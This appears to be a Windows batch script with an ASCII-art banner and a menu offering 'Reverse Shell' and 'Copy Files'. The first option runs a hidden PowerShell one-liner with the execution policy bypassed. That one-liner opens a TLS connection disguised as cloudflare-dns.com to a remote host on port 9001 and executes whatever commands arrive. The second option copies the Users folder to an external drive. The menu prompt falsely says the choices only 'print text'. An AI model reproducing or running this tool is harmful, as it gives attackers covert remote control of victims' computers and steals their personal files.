echo  ((    (     (  (   ( (   (   (  (   
echo  ))\   )\  ( (\ )\  )\)\: )\  (\ )\  
echo ((_)) ((_) )\(\((_)(_)(_)(_() (\((_) 
echo(/ _ \((_))(_)( ) |__ || |(_)()( ) |__
echo| (_) | || | | _| / / __ | _` | _| / /
echo \__\_\\_._|_|__|_\_\_||_|__/_|__|_\_\
:start
ECHO.
ECHO 1. Reverse Shell
ECHO 2. Copy Files
ECHO 3. Exit
set choice=
set /p choice=Type the number to print text.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.10.10', 9001);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
if '%choice%'=='2' C:\
copy Users E:\Copy
if '%choice%'=='3' Exit
ECHO "%choice%" is not valid, try again
ECHO.
goto start
:hello
ECHO HELLO
goto end
:bye
ECHO BYE
goto end
:test
ECHO TEST
goto end
:end
pause